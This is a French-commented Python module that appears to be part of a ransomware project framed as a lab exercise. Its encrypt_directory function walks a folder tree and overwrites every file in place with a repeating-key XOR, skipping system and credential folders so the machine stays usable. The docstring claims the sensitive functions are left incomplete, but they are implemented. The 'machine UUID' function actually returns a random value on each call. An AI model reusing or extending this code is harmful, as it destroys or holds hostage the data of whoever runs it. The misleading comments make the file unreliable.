"""
Module system.py
----------------

Ce module regroupe les fonctions liées au système de fichiers :

- récupération de l'UUID machine
- gestion des chemins
- structure pour le chiffrement/déchiffrement local

Les fonctions sensibles (chiffrement réel, écriture de fichiers)
sont volontairement laissées à compléter dans un environnement
de laboratoire contrôlé.
"""

from pathlib import Path

EXCLUDED_DIRS = {
    ".cache",
    ".config",
    ".local",
    ".vscode-server",
    ".ssh",
    ".gnupg",
    ".mozilla",
    ".thunderbird",
    "snap",
}

def get_machine_uuid() -> str:
    try:
        with open("/proc/sys/kernel/random/uuid", "r") as f:
            return f.read().strip()
    except Exception:
        return "unknown-uuid"


def should_exclude(path: Path) -> bool:
    return any(part in EXCLUDED_DIRS for part in path.parts)


def encrypt_file(path: Path, key: str):
    try:
        data = path.read_bytes()
        key_bytes = key.encode()
        out = bytearray()
        for i, b in enumerate(data):
            out.append(b ^ key_bytes[i % len(key_bytes)])
        path.write_bytes(bytes(out))
    except Exception as e:
        print(f"[ERROR] Impossible de chiffrer {path}: {e}")


def decrypt_file(path: Path, key: str):
    encrypt_file(path, key)


def encrypt_directory(root: Path, key: str):
    if root == Path.home():
        print("[SECURITY] Refus de chiffrer tout le HOME.")
        return

    for path in root.rglob("*"):
        if path.is_file() and not should_exclude(path):
            encrypt_file(path, key)


def decrypt_directory(root: Path, key: str):
    encrypt_directory(root, key)
